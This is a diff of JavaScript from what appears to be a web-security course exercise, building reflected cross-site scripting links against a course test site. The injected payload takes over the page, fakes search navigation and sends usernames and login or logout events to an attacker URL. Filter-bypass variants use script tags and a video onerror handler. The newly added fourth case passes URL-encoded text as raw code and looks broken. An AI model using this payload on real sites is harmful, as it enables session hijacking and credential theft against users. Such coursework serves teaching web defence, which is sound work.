@@ -34,12 +34,8 @@ function payload(attacker) {
 
 			$(/#search-btn/.source).click(function(event)
 			{
-				//historyF();
-				// do not take default action
 				event.preventDefault();
-				// get input query
 				q = $(/#query/.source).val();
-				//change URL to make it look like real search
 				history.pushState(href,null, /search?q=/.source + q);
 				proxy(/search?q=/.source + q);
 
@@ -47,8 +43,6 @@ function payload(attacker) {
 
 			$(/#search-again-btn/.source).click(function(event)
 			{
-				//historyF();
-				//bring u back home
 				history.pushState(null,null,href);
 				event.preventDefault();
 				proxy(x)
@@ -57,7 +51,6 @@ function payload(attacker) {
 
 			$(/#bungle-lnk/.source).click(function(event) 
 			{
-				//historyF();
 				history.pushState(null,null,href);
 				event.preventDefault();
 				proxy(x);
@@ -65,11 +58,8 @@ function payload(attacker) {
 
 			$(/#log-out-btn/.source).click(function(event)
 			{
-				// DO NOT ALLOW default
 				event.preventDefault();
-				// log logging out
 				$.get(attacker,{event: /logout/.source, user:$(/#username/.source).val()});
-				// go back to original state
 				$.post(link + /logout/.source,function(){
 					history.pushState(null,null,x);
 					proxy(x);
@@ -77,7 +67,6 @@ function payload(attacker) {
 			});
 		   $(/#log-in-btn/.source).click(function(event)
 		   {
-		   	// do not allow default
 		    	event.preventDefault();
 
 		   		$.post(link + /login/.source, 
@@ -105,7 +94,6 @@ function payload(attacker) {
 	}
 
 	$("html").hide();
-//	proxy(attacker,"./");
 	proxy(x);
 }
 function makeLink(xssdefense, target, attacker) {
@@ -113,7 +101,6 @@ function makeLink(xssdefense, target, attacker) {
 		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
 	} 
 	else {
-	// Implement code to defeat XSS defenses here.
 	switch(xssdefense)
     {
         case 1:
@@ -126,11 +113,13 @@ function makeLink(xssdefense, target, attacker) {
         case 3:
             return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<video src='xxx' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'>");
             break;
+        case 4:
+        	return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent(%22%3Cscript%22+%2B+%22%3E%22+%2B+payload.toString%28%29+%2B+%22%3Bpayload%28%5C%22%22+%2B+attacker+%2B+%22%5C%22%29%3B%3C%2Fscript%22+%2B+%22%3E%22%29);
 	}
 	}
 }
 
-var xssdefense = 3;
+var xssdefense = 4;
 var target = "http://trurl.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
